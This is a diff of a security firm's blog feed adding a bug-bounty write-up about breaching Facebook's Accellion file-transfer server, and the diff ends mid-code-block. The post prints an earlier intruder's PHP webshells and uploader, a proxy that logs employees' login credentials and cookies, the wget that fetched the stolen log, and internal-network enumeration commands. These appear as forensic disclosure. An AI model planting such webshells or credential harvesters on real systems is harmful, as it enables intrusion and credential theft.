@@ -4,13 +4,748 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="http://devco.re/" rel="self"/>
  <link href="http://devco.re"/>
- <updated>2016-02-15T16:36:08+08:00</updated>
+ <updated>2016-04-21T14:48:25+08:00</updated>
  <id>http://devco.re</id>
  <author>
    <name>DEVCORE</name>
    <email>contact [at] devco.re</email>
  </author>
 
+ 
+ <entry>
+   <title>How I Hacked Facebook, and Found Someone's Backdoor Script</title>
+   <link href="http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/"/>
+   <updated>2016-04-21T00:00:00+08:00</updated>
+   <id>http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver</id>
+   <content type="html">
+&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
+&lt;a href=&quot;http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt; (中文版本)&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://2.bp.blogspot.com/-8s6XWWiUGXU/Vxhye5uEG9I/AAAAAAAADks/XfF97zbxPTMbf1zV4nB6r3Gd75p9tEDgQCLcB/s1600/facebook.jpg&quot; alt=&quot;Facebook&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;foreword&quot;&gt;Foreword&lt;/h3&gt;
+
+&lt;p&gt;As a pentester, I love server-side vulnerabilities more than client-side ones. Why? Because it’s way much cooler to take over the server directly and gain system SHELL privileges. &amp;lt;(￣︶￣)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;Of course, both vulnerabilities from the server-side and the client-side are indispensable in a perfect penetration test. Sometimes, in order to take over the server more elegantly, it also need some client-side vulnerabilities to do the trick. But speaking of finding vulnerabilities, I prefer to find server-side vulnerabilities first.&lt;/p&gt;
+
+&lt;p&gt;With the growing popularity of Facebook around the world, I’ve always been interested in testing the security of Facebook. Luckily, in 2012, Facebook launched the &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty Program&lt;/a&gt;, which even motivated me to give it a shot.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;From a pentester’s view, I tend to start from recon and do some research. First, I’ll determine how large is the “territory” of the company on the internet, then…try to find a nice entrance to get in, for example:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;What can I find by Google Hacking?&lt;/li&gt;
+  &lt;li&gt;How many B Class IP addresses are used? How many C Class IPs?&lt;/li&gt;
+  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
+  &lt;li&gt;What domain names are used? What are their internal domain names? Then proceed with enumerating sub-domains&lt;/li&gt;
+  &lt;li&gt;What are their preferred techniques and equipment vendors?&lt;/li&gt;
+  &lt;li&gt;Any data breach on Github or Pastebin?&lt;/li&gt;
+  &lt;li&gt;…etc&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Of course, Bug Bounty is nothing about firing random attacks without restrictions. By comparing your findings with the permitted actions set forth by Bug Bounty, the overlapping part will be the part worth trying.&lt;/p&gt;
+
+&lt;p&gt;Here I’d like to explain some common security problems found in large corporations during pentesting by giving an example.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;For most enterprises, “&lt;strong&gt;Network Boundary&lt;/strong&gt;” is a rather difficult part to take care of. When the scale of a company has grown large, there are tens of thousands of routers, servers, computers for the MIS to handle, it’s impossible to build up a perfect mechanism of protection. Security attacks can only be defended with general rules, but a successful attack only needs a tiny weak spot. That’s why luck is often on the attacker’s side: a vulnerable server on the “border” is enough to grant a ticket to the internal network!&lt;/li&gt;
+  &lt;li&gt;Lack of awareness in “&lt;strong&gt;Networking Equipment&lt;/strong&gt;” protection. Most networking equipment doesn’t offer delicate SHELL controls and can only be configured on the user interface. Oftentimes the protection of these devices is built on the Network Layer. However, users might not even notice if these devices were compromised by 0-Day or 1-Day attacks.&lt;/li&gt;
+  &lt;li&gt;Security of people: now we have witnessed the emergence of the “&lt;strong&gt;Breached Database&lt;/strong&gt;” (aka “&lt;strong&gt;Social Engineering Database&lt;/strong&gt;” in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN access…then voilà! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Man’s password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P&lt;br /&gt;
+&lt;br /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;For sure, when looking for the vulnerabilities on Facebook, I followed the thinking of the penetration tests which I was used to. When I was doing some recon and research, not only did I look up the domain names of Facebook itself, but also tried Reverse Whois. And to my surprise, I found an INTERESTING domain name:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;tfbnw.net
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;TFBNW seemed to stand for “&lt;strong&gt;TheFacebook Network&lt;/strong&gt;”  
+Then I found bellow server through public data&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;vpn.tfbnw.net
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;WOW. When I accessed vpn.tfbnw.net there’s the Juniper SSL VPN login interface. But its version seemed to be quite new and there was no vulnerability can be directly exploited…nevertheless, it brought up the beginning of the following story.&lt;/p&gt;
+
+&lt;p&gt;It looked like TFBNW was an internal domain name for Facebook. Let’s try to enumerate the C Class IPs of vpn.tfbnw.net and found some interesting servers, for example:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
+  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
+  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
+  &lt;li&gt;Oracle E-Business&lt;/li&gt;
+  &lt;li&gt;MobileIron MDM&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;From the info of these servers, I thought that these C Class IPs were relatively important for Facebook. Now, the whole story officially starts here.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;vulnerability-discovery&quot;&gt;Vulnerability Discovery&lt;/h3&gt;
+
+&lt;p&gt;I found a special server among these C Class IPs.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;files.fb.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-QTb-UeZgA4c/VsNtZZFa92I/AAAAAAAAA0k/zl9ckrR2aIc/w1358-h732-no/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;
+&lt;em&gt;↑ Login Interface of files.fb.com&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+Judging from the LOGO and Footer, this seems to be Accellion’s Secure File Transfer (hereafter known as FTA)&lt;/p&gt;
+
+&lt;p&gt;FTA is a product which enables secure file transfer, online file sharing and syncing, as well as integration with Single Sign-on mechanisms including AD, LDAP and Kerberos. The Enterprise version even supports SSL VPN service.&lt;/p&gt;
+
+&lt;p&gt;Upon seeing this, the first thing I did was searching for publicized exploits on the internet. The latest one was found by HD Moore and made public on this Rapid7’s Advisory&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Whether this vulnerability is exploitable can be determined by the version information leaked from “&lt;strong&gt;/tws/getStatus&lt;/strong&gt;”. At the time I discovered files.fb.com the defective v0.18 has already been updated to v0.20. But from the fragments of source code mentioned in the Advisory, I felt that with such coding style there should still be security issues remained in FTA if I kept looking. Therefore, I began to look for 0-Day vulnerabilities on FTA products!&lt;/p&gt;
+
+&lt;p&gt;Actually, from black-box testing, I didn’t find any possible vulnerabilities, and I had to try white-box testing. After gathering the source codes of previous versions FTA from several resources I could finally proceed with my research!&lt;/p&gt;
+
+&lt;p&gt;The FTA Product&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Web-based user interfaces were mainly composed of Perl &amp;amp; PHP&lt;/li&gt;
+  &lt;li&gt;The PHP source codes were encrypted by IonCube&lt;/li&gt;
+  &lt;li&gt;Lots of Perl Daemons in the background&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;First I tried to decrypt IonCube encryption. In order to avoid being reviewed by the hackers, a lot of network equipment vendors will encrypt their product source codes. Fortunately, the IonCube version used by FTA was not up to date and could be decrypted with ready-made tools. But I still  had to fix some details, or it’s gonna be messy…&lt;/p&gt;
+
+&lt;p&gt;After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T&lt;br /&gt;
+And the vulnerabilities which needed to be triggered were not easy to exploit. Therefore I need to look deeper!&lt;/p&gt;
+
+&lt;p&gt;Finally, I found 7 vulnerabilities, including&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
+  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
+  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
+  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Apart from reporting to Facebook Security Team, other vulnerabilities were submitted to Accellion Support Team in Advisory for their reference. After vendor patched, I also sent these to CERT/CC and they assigned 4 CVEs for these vulnerabilities.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
+  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
+  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
+  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;More details will be published after full disclosure policy!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-j0wWW746G9w/VsNtZRRFO0I/AAAAAAAAA0s/w2DWhzGEW9c/w739-h440-no/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;
+&lt;em&gt;↑ Using Pre-Auth SQL Injection to Write Webshell&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+After taking control of the server successfully, the first thing is to check whether the server environment is friendly to you. To stay on the server longer, you have to be familiar with the environments, restrictions, logs, etc and try hard not to be detected. :P&lt;/p&gt;
+
+&lt;p&gt;There are some restrictions on the server:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Firewall outbound connection unavailable, including TCP, UDP, port 53, 80 and 443&lt;/li&gt;
+  &lt;li&gt;Remote Syslog server&lt;/li&gt;
+  &lt;li&gt;Auditd logs enabled&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Although the outbound connection was not available, but it looked like ICMP Tunnel was working. Nevertheless, this was only a Bug Bounty Program, we could simply control the server with a webshell.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;was-there-something-strange&quot;&gt;Was There Something Strange?&lt;/h3&gt;
+
+&lt;p&gt;While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.&lt;/p&gt;
+
+&lt;p&gt;First of all I found some strange PHP error messages in “&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;”  
+These error messages seemed to be caused by modifying codes online?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-PG1ENyW2WOQ/VsNtZZhaROI/AAAAAAAAA0o/x6hGv4HyPng/w1358-h732-no/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;
+&lt;em&gt;↑ PHP error log&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+I followed the PHP paths in error messages and ended up with discovering suspicious WEBSHELL files left by previous “visitors”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-2-8aZhSWGkk/VsNtZ0hOPpI/AAAAAAAAA0w/UBwhhct9Nmc/w728-h559-no/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;
+&lt;em&gt;↑ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;some contents of the files are as follows:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Right, THAT &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;bN3d10Aw.php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;uploader.php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;f][&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;], basename(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$_FILES[&amp;quot;f&amp;quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;])); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;d.php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/remote.inc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;sclient_user_class_standard.inc.orig&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/B3dKe9sQaa0L.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+
+&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Y-m-d H:i:s T&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;HTTP_USER_AGENT&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;POST=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;GET=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;COOKIE=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+
+&lt;span class=&quot;c1&quot;&gt;// blah blah blah...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The first few ones were typical PHP one-line backdoor and there’s one exception: “&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;”&lt;/p&gt;
+
+&lt;p&gt;In include_once “&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;” was the original PHP app for password verification, and the hacker created a proxy in between to log GET, POST, COOKIE values while some important operations were under way.&lt;/p&gt;
+
+&lt;p&gt;A brief summary, the hacker created a proxy on the credential page to log the credentials of Facebook employees. These logged passwords were stored under web directory for the hacker to use WGET every once in a while&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-Z3OiEcB8VTg/VsNtaA_lgBI/AAAAAAAAA00/BiZzrwkXjR8/w649-h88-no/5.jpg&quot; alt=&quot;logged password&quot; /&gt;
+&lt;em&gt;↑ Logged passwords&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;From this info we can see that apart from the logged credentials there were also contents of letters requesting files from FTA, and these logged credentials were rotated regularly (this will be mentioned later, that’s kinda cheap…XD)&lt;/p&gt;
+
+&lt;p&gt;And at the time I discovered these, there were around 300 logged credentials dated between February 1st to 7th, from February 1st, mostly “&lt;strong&gt;@fb.com&lt;/strong&gt;” and “&lt;strong&gt;@facebook.com&lt;/strong&gt;”. Upon seeing it I thought it’s a pretty serious security incident. In FTA, there were mainly two modes for user login&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Regular users sign up: their password hash were stored in the database and hashed encrypted with SHA256+SALT&lt;/li&gt;
+  &lt;li&gt;All Facebook employees (@fb.com) used LDAP and authenticated by AD Server&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;I believe these logged credentials were real passwords and I &lt;strong&gt;**GUESS&lt;/strong&gt;** they can access to services such as Mail OWA, VPN for advanced penetration…&lt;/p&gt;
+
+&lt;p&gt;In addition, this hacker might be careless:P&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;The backdoor parameters were passed through GET method and his footprinting can be identified easily in from web log&lt;/li&gt;
+  &lt;li&gt;When the hacker was sending out commands, he didn’t take care of STDERR, and left a lot of command error messages in web log which the hacker’s operations could be seen&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;
+From access.log, every few days the hacker will clear all the credentials he logged&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168.54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &amp;#39;12069238df&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&amp;#39; 2&amp;gt;/dev/stdout HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Packing files&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat tmp_list3_2 &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; cp /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; 2&amp;gt;/dev/stdout
+tar -czvf files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Enumerating internal network architecture&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
+telnet archibus.facebook.com 80
+curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;nb&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
+dig a records.fb.com
+telnet records.fb.com 80
+telnet records.fb.com 443
+wget -O- -q http://192.168.41.16
+dig a acme.facebook.com
+./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;for i in &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &amp;quot;192.168.&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&amp;quot;; done; done&amp;#39; 